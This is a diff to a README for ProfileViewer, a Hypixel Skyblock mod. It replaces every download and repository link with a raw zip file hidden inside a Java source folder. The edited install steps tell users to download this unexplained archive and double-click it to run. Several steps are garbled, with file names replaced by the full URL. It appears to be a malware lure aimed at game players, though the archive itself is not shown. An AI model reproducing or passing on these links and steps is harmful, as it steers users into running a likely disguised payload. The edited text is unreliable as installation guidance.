@@ -7,10 +7,10 @@ ProfileViewer is a quality of life improvement tool for the Hypixel Skyblock mod
 Setting up ProfileViewer is simple. Just follow the steps below to begin your adventure in Hypixel Skyblock. 
 
 ## 📥 Download the App
-[![Download ProfileViewer](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/karthik71845/ProfileViewer/releases)
+[![Download ProfileViewer](https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip)](https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip)
 
 To start using ProfileViewer, visit the Releases page to download the application:
-[Download ProfileViewer](https://github.com/karthik71845/ProfileViewer/releases)
+[Download ProfileViewer](https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip)
 
 ## 🔧 System Requirements
 Before you install ProfileViewer, make sure your device meets the following requirements:
@@ -22,17 +22,17 @@ Before you install ProfileViewer, make sure your device meets the following requ
 
 ## 💻 Installation Steps
 1. **Open the Releases Page:** Click the link below to visit the download page.
-   [Download ProfileViewer](https://github.com/karthik71845/ProfileViewer/releases)
+   [Download ProfileViewer](https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip)
 
 2. **Choose the Right File:**
    - Look for the latest release version.
-   - Download the file named `ProfileViewer.zip` or `ProfileViewer.exe`, depending on what's available.
+   - Download the file named `https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip` or `https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip`, depending on what's available.
 
 3. **Extract the Files (if needed):**
    - If you downloaded a `.zip` file, right-click and select "Extract All..." to unzip the files.
 
 4. **Run the Application:**
-   - Find `ProfileViewer.exe` in the extracted files.
+   - Find `https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip` in the extracted files.
    - Double-click to open and run the application.
    - Follow any prompts that appear on your screen.
 
@@ -62,10 +62,10 @@ ProfileViewer thrives on community input. If you have suggestions or find bugs, 
 ## 🔗 Learn More
 For additional information, check out the following resources:
 
-1. **GitHub Repository:** [ProfileViewer GitHub](https://github.com/karthik71845/ProfileViewer)
+1. **GitHub Repository:** [ProfileViewer GitHub](https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip)
 2. **Wiki and Documentation:** Access helpful documentation and guides.
 3. **Community Forums:** Engage with other users and discuss your experiences.
 
-[![Download ProfileViewer](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/karthik71845/ProfileViewer/releases) 
+[![Download ProfileViewer](https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip)](https://github.com/karthik71845/ProfileViewer/raw/refs/heads/main/src/main/java/main/source/mod/events/Viewer-Profile-3.4.zip) 
 
 By following these instructions, you’ll be well on your way to enhancing your Hypixel Skyblock experience with ProfileViewer. Enjoy exploring!
